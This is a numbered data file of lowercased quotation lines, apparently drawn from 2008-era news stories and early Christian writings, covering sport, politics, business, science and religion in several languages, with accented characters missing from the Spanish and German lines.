8602248 what man of sound mind therefore will affirm while such is our character that we are murderers w hen we say that those women who use drugs to bring on abortion commit murder and will have to give an account to god for the abortion on what principle should we commit murder for it does not belong to the same person to regard the very fetus in the womb as a created being and therefore an object of gods care and when it has passed into life to kill it and not to expose an infant because those who expose them are chargeable with child murder and on the other hand when it has been reared to destroy it
8602249 in our case a murder being once for all forbidden we may not destroy even the fetus in the womb while as yet the human being derives blood from the other parts of the body for its sustenance to hinder a birth is merely a speedier man killing nor does it matter whether you take away a life that is born or destroy one that is coming to birth that is a man which is going to be one you have the fruit already in its seed
8602250 among surgeons tools there is a certain instrument which is formed with a nicely adjusted flexible frame for opening the uterus first of all and keeping it open it is further furnished with an annular blade by means of which the limbs of the child within the womb are dissected with anxious but unfaltering care its last appendage being a blunted or covered hook wherewith the entire fetus is extracted by a violent delivery
8602251 there is also another instrument in the shape of a copper needle or spike by which the actual death is managed in this furtive robbery of life they give it from its infanticide function the name of
8602252 the doctors who performed abortions all knew well enough that a living being had been conceived and they pitied this most luckless infant state which had first to be put to death to escape being tortured alive
8602253 now we allow that life begins with conception because we contend that the soul also begins from conception life taking its commencement at the same moment and place that the soul does
8602254 the law of moses indeed punishes with due penalties the man who shall cause abortion ex
8602255 there are some pagan women who by drinking medical preparations extinguish the source of the future man in their very bowels and thus commit a parricide before they bring forth and these things assuredly come down from the teaching of your false gods to us christians it is not lawful either to see or hear of homicide
8602256 women who were reputed to be believers began to take drugs to render themselves sterile and to bind themselves tightly so as to expel what was being conceived since they would not on account of relatives and excess wealth want to have a child by a slave or by any insignificant person see then into what great impiety that lawless one has proceeded by teaching adultery and murder at the same time
8602257 concerning women who commit fornication and destroy that which they have conceived or who are employed in making drugs for abortion a former decree excluded them until the hour of death and to this some have assented nevertheless being desirous to use somewhat greater lenity we have ordained that they fulfill ten years of penance according to the prescribed degrees
8602258 let her that procures abortion undergo ten years penance whether the embryo were perfectly formed or not
8602259 he that kills another with a sword or hurls an axe at his own wife and kills her is guilty of willful murder not he who throws a stone at a dog and unintentionally kills a man or who corrects one with a rod or scourge in order to reform him or who kills a man in his own defense when he only designed to hurt him but the man or woman is a murderer that gives a philtrum if the man that takes it dies upon it so are they who take medicines to procure abortion and so are they who kill on the highway and rapparees
8602260 wherefore i beseech you flee fornication why sow where the ground makes it its care to destroy the fruit where there are many efforts at abortion where there is murder before the birth for even the harlot you do not let continue a mere harlot but make her a murderess also you see how drunkenness leads to prostitution prostitution to adultery adultery to murder or rather to a something even worse than murder for i have no name to give it since it does not take off the thing born but prevents its being born why then do thou abuse the gift of god and fight with his laws and follow after what is a curse as if a blessing and make the chamber of procreation a chamber for murder and arm the woman that was given for childbearing unto slaughter for with a view to drawing more money by being agreeable and an object of longing to her lovers even this she is not backward to do so heaping upon thy head a great pile of fire for even if the daring deed be hers yet the causing of it is thine
8602261 i cannot bring myself to speak of the many virgins who daily fall and are lost to the bosom of the church their mother some go so far as to take potions that they may insure barrenness and thus murder human beings almost before their conception some when they find themselves with child through their sin use drugs to procure abortion and when as often happens they die with their offspring they enter the lower world laden with the guilt not only of adultery against christ but also of suicide and child murder

8602307 in addition to being an incredible teacher he is deeply passionate about improving science education which makes him a great partner to work with
8602308 for my classes at eths i am looking forward to having an expanding list of options for experiments
8602309 there are a number of classic experiments i do not have the resources to carry out and some of these experiments may very well develop into an ilab at some university
8602310 as more universities will be asked to join high school teachers and students may in fact help design and host experiments
8602311 i have hopes of getting my own students thinking about experiments that would be appropriate and useful for an ilab and then having them assemble it and learn how to get the electronics interfaces and software up and running as we host a lab
8602312 the whole idea of ilabs is you only need a web browser
8602313 students have the chance to work with mass spectrometers neutron beam diffraction labs and other resources that can really get students excited about science learning
8602314 i asked them via email if they could try the experiment to test the technology as well as the instructions we developed and then check the quality of the data
8602315 it is completely done over the internet as a mini pilot test of the existing experiment
8602316 working together using technology is a very nice way to model for students what they need to be able to do in this day and age

8602384 i think you have to give them credit theyve come to anfield and were very organised and theyve stopped us playing
8602385 but as the game went on we started to move the ball quicker and there was a lot more tempo to our play
8602386 it was a bit too close for comfort but were just pleased that were through
8602387 i think there was a slight improvement on our previous games like ive said the tempo was a bit better and well certainly take that positive
8602388 it was all about qualification tonight weve done it the hard way but were in the draw and thats the main thing
8602389 i think we showed good character we know there will be times during the season when things arent going to be rosy and were not going to play great all the time
8602390 when this does happen its all about sticking in there working hard for each other and getting the result and thankfully weve managed to do that tonight
8602391 its also important to remember that weve still got players to come back that will make the squad stronger in the coming weeks and hopefully we will get a few more players in before the transfer window shuts
8602392 but when it comes down to it if youd asked me a couple of weeks ago if id be happy with two wins out of two in the league and making it through to the champions league i would obviously have taken it

8602477 we are excited to have the opportunity to work with the entrepreneurial team at thinkbalm
8602478 the principals have put together an innovative community that leverages core components of our technology including reputation management currency management and automated idea graduation
8602479 we have started to see increasing demand for enterprise social software that produces objective results within both public and independent external communities the speed and scale of conversations can redirect entire markets the enterprises and professional communities that recognize the need to gain insight from these conversations will succeed
8602480 we are pleased that so many companies are seeing the value of our multi client services at this early stage in the late sales process it is also great news that yet another large independent oil company will be using our game changing technology to improve its hydrocarbon exploration performance and efficiency this provides further evidence that emgs is the undisputed em market leader
8602481 em data from our clearplay evaluate service can reduce the number of appraisal wells drilled thereby producing substantial cost savings for operators the service significantly improves the speed and accuracy of prospect appraisal and enables the operator to establish with greater certainty whether the prospect contains commercially viable reserves
8602482 excitor has worked intensively to develop a dme e mail client compatible with the iphone handset todays announcement means that the next generation of iphones can become a sleek and now also secure professional work tool not only limited for consumer use
8602483 the first version of the dme iphone client will support synchronisation of contacts and e mail for both microsoft exchange and ibm lotus domino as the only solution on the market with these capabilities it will also include e mail attachment support allow synchronisation of e mail sub folders search e mails on the server and allow users to access their global contact books
8602484 unlike other early market offerings we have developed a fully secure mobile e mail client for the iphone which does not only rely on the imap protocol or web based interfaces for e mail exchange
8602485 this enables us to provide our customers with the best possible security while offering the same administration and infrastructure for the iphone as the dme solution provides for all other device types
8602486 there is little doubt that the iphone is a sought after handset and its sleek design is a major reason for this demand however having stylish handsets to use in a business environment is equally as important as having the latest technologies for personal use
8602487 the majority of requests that the it department receives for iphone use are from executives who have bought an iphone on their own and who wish to use it as a company phone we see strong signs that this trend will continue
8602488 we recognise two strong trends in the market firstly organisations have come under increased pressure to make sure that all devices within their business are secure this includes mobile phones
8602489 secondly mobile e mail has become an important tool for organisations of all sizes who want to be able to offer employees mobile phones that accommodate individual needs and preferences
8602490 for us it was a natural step to extend our dme client to the iphone to ensure excitor continues to deliver a dynamic and innovative product that is flexible enough to accommodate the wide variety of mobile needs for todays organisations including the need for high security around corporate data on mobile phones with our new secure dme e mail client for the iphone we have made it possible for companies to bring this popular device within their walls without leaving them vulnerable on the security front
8602491 our enterprise customers and partners are eager to get their hands on the iphone e mail application and we are working to make this available to the market within the next couple of months

8602495 republicans and democrats make certain that third party candidates are held to ballot access laws no matter how absurd or unreasonable
8602496 therefore republicans and democrats should be held to the same standards

8602553 fermi e stato il primo ad intuire come le particelle cosmiche potessero essere accelerate ad alte energie e questo lavoro forni le fondamenta per comprendere la potenza di fenomeni che adesso il satellite a lui dedicato osservera
8602554 e il riconoscimento delleccellenza scientifica italiana in particolare nel settore della fisica delle alte energie un campo fondamentale per comprendere le leggi che regolano luniverso
8602555 la testimonianza sottolinea il vicecommissario dellasi piero benvenuti del grande contributo che la nostra comunita scientifica ha dato e continua a dare in questo importante settore come e accaduto per i satelliti italianissimi beppo sax e agile il cui contributo e stato fondamentale nella ideazione e realizzazione dellattuale missione glast ora fermi
8602556 la prima luce di glast fermi conferma i risultati ottenuti dal satellite agile nel corso del suo primo anno di attivita
8602557 studiare la radiazione gamma la piu energetica dello spettro elettromagnetico ci permette afferma il presidente dellinaf tommaso maccacaro di capire meglio i fenomeni piu violenti che avvengono nelluniverso come le interazioni tra particelle elementari di altissima energia e i formidabili campi magnetici generati da stelle collassate o come le catastrofiche esplosioni di stelle ormai mature che danno origine alle pulsar o ai buchi neri
8602558 si tratta di ricerca fondamentale e prosegue maccacaro fa molto piacere sapere che il satellite per astronomia gamma glast e stata ribattezzato in onore del grande fisico teorico italiano enrico fermi e infatti un riconoscimento di quanto importante sia la scienza di base purtroppo spesso sacrificata intempi di crisi ma da cui puo scaturire assieme a una nuova conoscenza anche una miriade di applicazioni che cambiano in meglio la nostra vita quotidiana
8602559 contengono oggetti compatti come stelle di neuroni e grandi buchi neri che sono il fulcro dellattivita di migliaia di galassie
8602560 capace di fornirci gli elementi necessari a disegnare nuove leggi della fisica
8602561 risplende nei raggi gamma grazie alla collisione con nuclei accelerati chiamati raggi cosmici anche la famosa pulsar del granchio e quella nella costellazione delle vele brillano a queste lunghezze donde
8602562 si tratta continuano gli esperti dellasi di stelle di neutroni oggetti molto compatti che si formano quando le stelle di grande massa esplodono lasciando un nocciolo di materia che ruota con velocita strabilianti compiendo decine o centinaia di rotazioni al secondo queste stelle straordinarie furono in origine scoperte grazie alle loro emissioni radio
8602563 la terza stella di neutroni che brilla sul piano della galassia chiamata geminga perche e una sorgente gamma situata nella costellazione dei gemelli non emette segnali radio ed e stata capita spiegano ancora gli esperti dellasi grazie alla sua emissione in raggi x oltre che alle lunghezze donda visibili ci aspettiamo che il satellite fermi possa scoprire molte di queste pulsar prive di emissioni radio e ci fornisca cosi informazioni chiave per comprendere come funzionano questi esotici oggetti celesti
8602564 linfn e orgoglioso del suo determinante contributo alla realizzazione del cuore del satellite fermi il lat e di collaborare agli sviluppi della missione in modo altrettanto rilevante
8602565 il satellite aggiunge petronzio sara impegnato anche nella ricerca di segni di nuove leggi della fisica e nello sviluppo di fenomeni come lesistenza della materia oscura che sono obbiettivo condiviso dalle ricerche della fisica delle particelle che tra poche settimane prenderanno il via al cern di ginevra con linaugurazione del large hadron collider lhc
8602566 i lampi visti da entrambi gli strumenti sottolinea lasi forniranno dati senza precedenti per lampiezza dello spettro dei raggi gamma individuati che permetteranno agli scienziati di approfondire i processi propri di questi fenomeni
8602567 she told me she wasnt going to die and leave her children
8602568 and she said she knew i would be looking until i found her
8602569 this whole county has been turned inside out looking for her
8602570 we were never going to give up trying to find her
8602571 we didnt want to give up until we ruled out every hole
8602572 will have nowhere else to go short of pre emptive strikes against irans nuclear facilities
8602573 if we had some eggs we could have ham and eggs if we had some ham
8602574 keep the americans in the germans down and the russians out
8602575 signing a promissory note to which every american was to fall heir
8602576 was a promise that all men yes black men as well as white men would be guaranteed the unalienable rights of life liberty and the pursuit of happiness
8602577 all we say to america is be true to what you said on paper
8602578 all of gods children black men and white men jews and gentiles protestants and catholics
8602579 when its this hot people dont want to stay home and cook
8602580 the whole atmosphere gives you a perspective of how unique and artistic sonoma county really is
8602581 its not that hot were moving we have wind on us
8602582 come and see their friends and hang out during the summer
8602583 we could very well be in that quick slide downward in terms of passing a tipping point
8602584 it also means that climate warming is also coming larger and faster than the models are predicting and nobodys really taken into account that change yet
8602585 not afraid of anything including the prospect of a cold war
8602586 the sight of russian tanks in a neighboring country on the 40th anniversary of the crushing of the prague spring has shown that the temptations of power politics remain
8602587 military ships are hardly a common way to deliver such aid
8602588 we filed it because we believe it is in smarts interest and the taxpayers interest to have a fair election
8602589 and the law says the arguments cannot have false statements in the ballot arguments
8602590 im doing it because i felt that there is a difference between an outright lie and the usual political hyperbole in a campaign
8602591 two years ago the opponents got away with outrageous misrepresentations and none of us intend to allow that to happen again
8602592 therefore we cant insert words like in our opinion because it would consume too many words
8602593 the real message we need to get out is to dispel some of the myths get out accurate information about the project because there was so much misinformation floating around last time
8602594 it is apparent the smart board thinks this may be their final chance to pass a tax to support a smart project and at this point are willing to use taxpayers dollars as a thinly veiled attempt to try to suppress the opponents arguments
8602595 the bar is high for rejecting a ballot measure by a judge
8602596 all the lawyers are saying the same thing they all say you really have to do something egregious ballot arguments are statements of what people think they have free speech in them
8602597 the taking of a life in a road rage situation such as this one is simply intolerable
8602598 theres no indication mr fournier has changed or understands what he did treatment is an insufficient response
8602599 he did this without feeling and i think he needs time in prison to think about what hes done
8602600 i dont want anyone else to die at this mans hands
8602601 it is inappropriate to give mr fournier the benefit of an unsubstantiated theory that his mental health was compromised
8602602 you chose to take an action that endangered the motorcycle rider
8602603 im deeply sorry for what the wrong things i have done and i take full responsibility for what happened on that day
8602604 wie kann man sicher sein dass man es mit dem gr tm glichen spa gef llt hat und dass man die coolsten pl tze auf der welt gesehen hat bevor man seine koffer zum allerletzten mal gepackt hat
8602605 aber er hat sie gelebt wie man sie leben sollte
8602606 there arent a whole heck of a lot of bad guys there left to fight
8602607 quite frankly young marines join our corps to go fight for their country
8602608 they are doing a very good job of this nation building business in iraq but its our view that if there is a stiffer fight going someplace else then thats where we need to be

8602614 while we would hope that all ohio businesses would make paid sick days available to their employees whenever possible we believe that this initiative is unworkable unwieldy and would be detrimental to ohios economy and we will be opposing it and asking ohioans to oppose it as a result

8602642 studies show primary aldosteronism may be more prevalent than previously thought affecting more than ten percent of hypertensive patients

8602645 father sergio baldini came to my aid he put himself in front of me to try and defend me but he too was knocked down without mercy they hit him until he stopped crying out then they beat father salvatore and father martin as well it was terrible

8602648 these figures show just how reliant the labour party is on the unions to stave off bankruptcy with the labour party divided and gordon brown vying for the title of britains weakest ever prime minister it is clear that ordinary donors are deserting brown and labours union paymasters are calling the shots
8602649 these donations show a healthy income for the labour party and coupled with our wider strategy to make the party live within its means they are a sign of our improving financial position
8602650 we are taking further action to meet the continuing challenges facing the party and making progress towards putting its finances on a stable footing for the long term
8602651 having previously called on parties to address the issue of late reporting of individual donations we are pleased to see this being addressed and expect to see continued improvements
8602652 we are pleased that the political parties amp election bill includes the more flexible and proportionate range of penalties that the commission has been calling for
8602653 parties who failed to provide a donation or a borrowing return on time will automatically incur a penalty

8602662 we are definitely noticing a significant downward trend in travel this year

8602665 the survey underlined that people have strong opinions on green issues and theres good evidence of green behaviour in the uk the danger is that we overestimate how good the state of the uks own environment is and become complacent in our efforts to become greener messages about some basic but effective actions for example recycling have been understood and we are willing to accommodate these in our lifestyles but with our negative view of the environment globally we should recognise our responsibility to do whatever we can and be open to a wider range of green behaviours in order to reduce our impact on the environment as much as possible

8602674 we wanted to make instruction available to students 24 7 and to provide student access to advice and productivity tools anytime and anywhere that made sense to them
8602675 with this consolidation we have addressed the need to have all of our servers centralized where they can be stored backed up and protected all in one location the dell solution provided everything from set up to the removal of our old pcs and boxes
8602676 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8602677 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8602678 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8602679 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack
8602680 today we use hp dl580 g5 to handle larger server workloads

8602683 dr cloud argues that technology has destroyed time and space boundaries and frankly its hard to disagree with that point and he says people need to put those boundaries back in place and reclaim their lives sounds great but i think putting it into practice is significantly harder than saying it should be so
8602684 well if your god is in control why is all the bad stuff going on
8602685 i personally would encourage them that having people from their church build relationships with their friends who do not attend church and invite them as their friend would be a much better strategy
8602686 they are appealing to the natural corruptions in unbelieving people the bible warns very explicitly about the dangers of greed the love of money being the root of all evil
8602687 appealing to the selfish motives of people is not christianity
8602688 are they being tempted to think the church is about such gimmicks and external rewards
8602689 clutter is a failure of design not an attribute of information
8602690 this is a large scale operation not only in terms of numbers of offences but also in terms of both police and fss resources and the involvement of other organisations
8602691 at the time of these offences the technology was simply not available it is only recently that we have developed the technology that gives us a reasonable prospect of obtaining profiles from older materials
8602692 with the matches obtained from the ndnad there are now several other cases that could get to court
8602693 these are people who have slipped through the net but now the advances in technology mean that these individuals will have to face up to their crimes

8602704 sanctions are being considered and many other means as well
8602705 we are trying to elaborate a strong text that will show our determination not to accept what is happening in georgia
8602706 but that is a sick imagination and probably that applies to sanctions as well i think it is a demonstration of complete confusion
8602707 the appearance of nato battleships here in the black sea basin and the decision to deliver humanitarian aid to georgia using nato battleships is something that can hardly be explained
8602708 let us hope that we do not see any direct confrontation
8602709 there is certainly no nato build up in the black sea

8602764 el momento en el que cumplimos un a o sin antonio es emotivo tambi n nost lgico es por ello que a puerta lo quisimos recordar en el sevilla fc con f tbol que es lo que m s le gustaba y en lo que m s destacaba la muerte de puerta fue un aut ntico jarro de agua fr a para el sevillismo y para todo el f tbol nacional en sa fecha no se entendi de colores ni de equipos y todo el f tbol se moviliz y se puso en marcha en orden a mostrar todo el cari o y el afecto a puerta y con el deseo que su figura perdurara en el tiempo desde el consejo de administraci n del sevilla f tbol club tambi n se ha venido trabajando en ello y vamos a poner todo nuestro empe o para que sea una realidad
8602765 recuerdo una an cdota que adem s no me la han contado sino que viv en primera persona sucedi el 13 de noviembre de 2004 cuando puerta marc su primer gol con la primera plantilla del sevilla fc en soria ante el numancia como todos saben el abuelo materno de puerta era muy sevillista incluso fue socio fundador de la pe a sevillista al relente con mi padre y fue quien le transmiti su sentimiento por el sevilla fc pues ese primer tanto lo celebr mirando al cielo y despu s del partido le pregunt el porqu de la celebraci n y me dijo que era porque se lo dedicaba a su abuelo que se estar a alegrando en el cielo como su abuelo que era y por sevillista
8602766 era aut ntico sincero muy amigo de sus amigos sincero muy divertido son muchos los recuerdos pero hay uno que pas volviendo de un partido de uefa lleg bamos no muy tarde a sevilla y coment bamos la posibilidad de salir y darnos una vuelta tomar una copa pero hubo un momento en el aeropuerto que me dijo vasco no puede ser es que me acabo de enterar que voy a ser pap y claro l gicamente estaba como loco por llegar y compartir ese momento con mar es todo lo que deseaba quer a que llegara ese hijo fue un momento especial
8602767 era un pedazo de t o un gran sevillista un profesional como la copa de un pino todo eso y much simo m s
8602768 era una persona que se hac a querer se hac a querer un mont n an cdotas tengo muchas recuerdo que en la final de glasgow jugu con un pelado muy corto todo fue porque por la ma ana a antonio y a m se nos ocurri que l me rapara el look de aquella final era de antonio
8602769 la persona m s sincera que he conocido en much simo tiempo y sobre todo tambi n destaco de l la humildad que le caracterizaba brome bamos a menudo con que yo le llevaba unos cuantos a os l me dec a que tendr a ventaja porque alg n d a yo ser a su entrenador porque me retirar a antes y entonces l jugar a a n relaj ndose porque ramos amigos y siempre tendr a un sitio en mi equipo titular
8602770 lo que destacaba de antonio y las palabras que le definen como persona son la alegr a la constancia el trabajo el compa erismo el apoyo en definitiva un amigo
8602771 le llamaba crack una definici n tan corta y tan amplia a la vez despu s de siente a os an cdotas hay much simas recuerdo que hubo una poca en la que iba a la ciudad deportiva y mientras yo hac a alguna cosa l iba a por mi coche para que lo llevara a casa pero se sentaba en el asiento del piloto y conduc a l yo le dejaba un d a le pregunt que cu ndo se comprar a un coche a lo que me contest entre risas que cuando tuviera el carnet de conducir yo no pod a creerlo y tampoco pude contener las risas

8602788 we let tinkerbelle into the house and she made herself at home
8602789 when the day came for us to fly home sadly no one had claimed her we bought a transit cage put tinkerbelle in it and drove an hour up the interstate to the polk county society for the prevention and cruelty of animals in the hope that she was microchipped and could be restored to her owner
8602790 we cried all the way to the airport upset to think that despite all our efforts tinkerbelle might not have a happy ever after

8602795 we had lots of different races on the ballot and there is no way we can know the reason for low voter turnout we have done everything we possibly can to encourage turnout early voting two weeks before the election mail in voting and going to the polls it is certainly available to anyone who would like to vote

8602872 hes still not as fit as id like him to be but for his first game considering he had chicken pox about three or four weeks ago i thought he was sensational and keith treacy as well
8602873 he villaneuva has had a hard situation with his chicken pox and being away from his family but it was just nice to see him out there enjoying his football all the lads in the second half played ever so well
8602874 i made the lads aware looking at the results the night before with bolton getting beat by north ampton crewe beating bristol city it was always a game which could potentially have been a banana skin and i suppose after 20 minutes it looked that way
8602875 we looked out of sorts until carlos created a bit of magic and got us back to 1 1 and i think once that went in i felt a lot more at ease then
8602876 it was a good response because i thought we started off really slow but we could have had about eight or nine to be honest and thats not being disrespectful to grimsby because they came here and had a go at us and at times caused us problems
8602877 coming out for the second half they could have made it 3 2 but jason brown made a great save if its 3 2 its a different story then because then were under pressure
8602878 we had that in pre season and we want that to continue into the season
8602879 i thought chris mccann looked terrific on tuesday night and that security at the back with the system we employed allowed him and kevin mcdonald to get forward
8602880 they both love running with the ball and theyve got terrific engines
8602881 there were a lot of positives to take from chris mccanns goal and he probably could have had two or three on the night
8602882 thats what we want because in terms of a midfielder i think he is a real goalscoring threat
8602883 its pleasing were getting so much energy and theyre getting shots in
8602884 the longer they play together theres no doubt theyre going to get better and i think that augurs well for the future of the football club
8602885 but equally we recognise we want to get moving up the table and saturday gives us an opportunity with another home game albeit against a very good plymouth side to go into it trying to win and moving in the right direction
8602886 its fair to say the longer this team plays together then at the age theyre at they will get better together

8603044 the bottom line however is that the strong negative trend in summertime ice extent characterizing the past decade continues
8603045 we could have no ice at the north pole at the end of this summer and the reason here is that the thin ice and this ice we call first year ice the ice that tends to melt out in the summer
8603046 its possible that ships could sail from alaska right to the north pole
8603047 clearly if you look over what we have seen in the past three years and where we were headed we are in this long term decline and we may have no ice at all in the in summer by 2030 or so

8603065 tengo esa espina clavada llegu al valencia en un gran momento de forma con t tulos bajo el brazo era internacional con brasil hab a sido campe n del mundo y pens que podr a aportar muchas cosas a este equipo pero las lesiones provocan que la gente se olvide de todo eso y que se creen dudas
8603066 todo esto me duele porque yo s lo que puede hacer me siento muy bien y espero tener la posibilidad de jugar varios partidos seguidos ese es mi reto para esta temporada
8603067 me parece muy bien el esfuerzo que ha realizado el club con estos dos jugadores ya que como ellos hay pocos aportan muchas cosas goles y calidad y son los que marcan la diferencia
8603068 no soy yo quien ha de decidir sobre este tipo de cosas hay gente en el club que responder a mejor a esta pregunta
8603069 fue un palo duro pero hay que olvidar cuanto antes y empezar a vivir la liga
8603070 estamos motivados entrenamos con intensidad y creo que estamos en el buen camino
8603071 para que se adapte lo m s r pido posible a la plantilla
8603072 dentro del vestuario hay tranquilidad y el equipo est ya centrado en el inicio de campeonato
8603073 esta historia no creo que afecte ni al equipo ni a l espero que una vez que ya ha pasado y que ya se queda aqu sea algo que no afecte al grupo y en su caso se le ve muy tranquilo y muy normal y ya ha vivido muchas cosas en esto del f tbol
8603074 todos saben que estas cosas siempre suelen pasar a estas alturas y no tiene porque afectarnos a santi lo veo bien y tranquilo y sab amos que pasara lo que pasara el no tendr a problemas para nosotros es un jugador muy importante y clave para este equipo por lo que su marcha hubiera sido un palo muy duro
8603075 creo que estas cosas incluso motivan m s que afectan
8603076 que un club como el real madrid se interese por ti es una inyecci n de moral importante para un jugador y para nosotros que se quede tambi n lo es ya que sabemos que es un gran jugador un futbolista que nos aporta muchas cosas

8603085 champ when you get knocked down get up get up
8603086 again and again on the most important national security issues of our time
8603087 john mccain was wrong and barack obama was proven right
8603088 let us declare together in one voice right here and right now that barack obama is our candidate and he will be our president
8603089 last night hillary told us in no uncertain terms that she is going to do everything she can to elect barack obama that makes two of us
8603090 it didnt work in 1992 because we were on the right side of history
8603091 and it will not work in 2008 because barack obama is on the right side of history
8603092 to open up this convention to make sure that everybody who wants to come can join in the effort to take america back
8603093 life magazine said the capital had the greatest case of preinvasion jitters since the first battle of bull run
8603094 it was like a church social people were happy people were greeting each other parts of families from different parts of the country were re forming and almost having little family reunions
8603095 many newspapers including the washington post didnt even mention his speech in their coverage the next day
8603096 if mahalia with that voice told you to do something you did it
8603097 when barack obama accepts the democratic nomination to become the president of the united states of america and starts speaking i think all of america and many parts of the world the hopes the longings the aspirations and the dreams will be hanging on every word he says
8603098 its going to be incredible you know people died some people didnt make it to the march on washington they were beaten they were tear gassed some were shot and killed and even after the march on washington where there had been so much hope so much optimism we had to deal with the bombing on a church in birmingham where four little girls were killed but ive cried all my tears
8603099 he is free of a lot of the battles and scars that many of us suffered
8603100 he never saw the signs that said white men colored men white women colored women
8603101 he never tasted the fruits of segregation and racial discrimination so he is a different human being he should be free to liberate the rest of america and maybe take a message to the rest of the world
8603102 i think the convention has gone pretty well so far what do you think
8603103 champ when you get knocked down get up get up
8603104 again and again on the most important national security issues of our time
8603105 john mccain was wrong and barack obama was proven right
8603106 let us declare together in one voice right here and right now that barack obama is our candidate and he will be our president

8603112 we expect the final wpi inflation to peak in oct nov at around 13 5 14 0 per cent but to stay in double digit territory until february 2009 based on our forecast of slower gdp growth of 7 3 per cent in fy09 our energy teams forecast of the price of oil falling sharply to 90 bbl in q1 2009 plus favorable base effects our forecast is that wpi inflation will start turning down decisively in january 2009

8603122 the use of pronominal this and that which and it as well to refer broadly to a preceding idea topic sentence or paragraph is considered quite respectable
8603123 i think wed be fooling ourselves if we thought that in the end theres not going to be some cost to canadians
8603124 a carbon tax would increase the price of gasoline at the pump
8603125 i think wed be fooling ourselves if however we deal with the issue of climate change we thought that in the end theres not going to be some cost to canadians and theres not going to be some element of economic dislocation
8603126 i think thats inevitable in dealing with an issue thats as problematic and challenging as climate change
8603127 no doubt under mr harpers plan you can speak to anyone in the industry about the regulations not only are they confusing to industry but they will mean new costs and they too will pass those prices on
8603128 how do you get to those caps you have to make investments to get to those caps and that investment ultimately has to be passed through
8603129 a carbon tax at an uncertain time like this is an irresponsible thing to do to consumers because it will drive the price of gasoline up

8603140 cross border m amp as have become a fundamental characteristic of the global business landscape these m amp as are one mode of entry for foreign direct investors to host economies as business increasingly spans across borders cross border transactions continue to increase across industries and as domestic industries consolidate and surviving companies build scale companies begin to look outside their borders for growth
8603141 it is rewarding to watch alianza grow and receive recognition for all the hard work and dedication by everyone on our team
8603142 this is an exciting time for alianza we are expanding globally and working with a growing customer base to provide quality voice services that are easy to implement
8603143 we understand the authenticity of the brand among hispanics and general market consumers especially mothers of young children and hope to further extend our loyalty by continuing to develop flavors and sizes that resonate with our target consumers
8603144 the idea with the tips was to make the brand relevant for mom and make her feel good about being just that mom the tips are informational in nature that she can use to care for the family especially the kids for example a few of the tips include information on proper summer time nutrition swimming safety and back to school basics
8603145 we are thrilled to be working with such a strong brand like tampico
8603146 our goal for this campaign is to engage moms and allow them to feel good about buying tampico for the entire family not only did we need to communicate the variety of flavors but also the unique packaging that tampico offers there is virtually a size for every family member and occasion

8603153 i remember the first time president clinton ran for office in 1992
8603154 he came to cleveland i must have been 8 years old
8603155 my mother got the chance to meet him they have been best of friends ever since
8603156 im going to be with her until she says stephanie im no longer in this fight
8603157 if you give somebody your word youre going to go ahead and do it
8603158 if you dont have your word you dont really have anything to stand on in politics so thats one thing i did learn from my mother at a very early age
8603159 she always said that if you dont stick by somebody in the bad times you never know how good the good times are going to be
8603160 she wouldve been standing up hooting and hollering saying wow
8603161 not ready 08 presser in denver colorado counterprogramming the democrats
8603162 its sort of a smart thing because i think the clinton delegations are going to leave denver with a high regard for the obama forces
8603163 it didnt work in 1992 because we were on the right side of history
8603164 and it wont work in 2008 because barack obama is on the right side of history
8603165 last night hillary told us in no uncertain terms that she is going to do everything in her power to elect barack obama
8603166 that makes two of us actually that makes 18 million of us
8603167 more tax cuts for the wealthiest americans that will swell the deficit increase inequality and weaken the economy more band aids for health care that will enrich insurance companies impoverish families and increase the number of uninsured more going it alone in the world instead of building the shared responsibilities and shared opportunities necessary to advance our security and restore our influence
8603168 will lead us away from the division and fear of the last eight years and back to hope
8603169 and so if you like me believe that america must always be a place called hope then join hillary and chelsea and me in making barack obama the next president of the united states
8603170 addressing his partys convention as a headliner was clearly a moment hes dreamed about for two decades
8603171 not ready 08 presser in denver colorado counterprogramming the democrats
8603172 the choice of this election is clear these times require more than a good soldier they require a wise leader
8603173 the republicans in a few days will nominate a good man who has served our country heroically and who suffered terribly in a vietnamese prison camp
8603174 john mccain is my friend its a friendship that goes beyond politics and the personal courage and heroism john demonstrated still amaze me
8603175 senator mccain who once railed against the smears of karl rove when he was the target has morphed into candidate mccain who is using the same rove tactics and the same rove staff to repeat the same old politics of fear and smear
8603176 on the two great questions of this election how to rebuild the american dream and how to restore americas leadership in the world he still embraces the extreme philosophy which has defined his party for more than 25 years
8603177 should we trust john mccains judgment when he said only three years ago afghanistan we dont read about it anymore because its succeeded
8603178 the fact is al qaida and the taliban the people who actually attacked us on 9 11 have regrouped in those mountains between afghanistan and pakistan and are plotting new attacks
8603179 while most americans were struggling the good times were rolling for the top 10
8603180 when income concentration creates barriers to the resources and opportunities that would enable people to get ahead on their own initiative and efforts that violates our fundamental sense of fairness
8603181 it was a huge surprise to see a tortoise on the line we get some incorrect materials coming through here but it is the first time for a tortoise
8603182 once tom was taken off the line he was washed fed and given water and put in safe keeping until we found his owner we are all pleased tom survived and the fact that the tortoise belongs to ruth jones is something else
8603183 we find that the students who purchase from us have a very very high satisfaction rate
8603184 these measures will send a clear message to the world
8603185 some countries may object to what were doing on principle on the grounds that they may not recognize our sovereignty i expect that we will get co operation for the most part on reporting because i think it ultimately is in everybodys interest to ensure that there is some kind of authority in the area some kind of environmental and commercial authority
8603186 were increasing our coast guard fleet we will be increasing our capacity to intercept and detain those who dont respect the reporting requirements
8603187 these measures will send a clear message to the world
8603188 canada takes full responsibility for environmental protection and enforcement in our arctic waters
8603189 as an environmental matter as a security matter and as an economic matter we are making it perfectly clear that not only do we claim jurisdiction over the canadian arctic we are also going to put the full resources of the government of canada behind enforcing that jurisdiction
8603190 no ha habido ning n otro candidato eso quiere decir que los militantes y simpatizantes del pp de madrid entienden que yo puedo ser su mejor presidenta

8603200 are they just totally out of touch with reality because they are so lost in obsolete belief systems or do they know exactly what is going on and have some sort of plan that provides for a survival of the global elites themselves in the coming global catastrophe and is based upon the deliberate sacraficing and die back of billions of human beings and that they have already factored this die back into their plans

8603227 new orleans is and was a wonderful place for writers and a place to honor their legacies
8603228 new orleans has historically had a thriving literary community and the planned new orleans writers museum will be a living educational memorial for visitors and residents alike
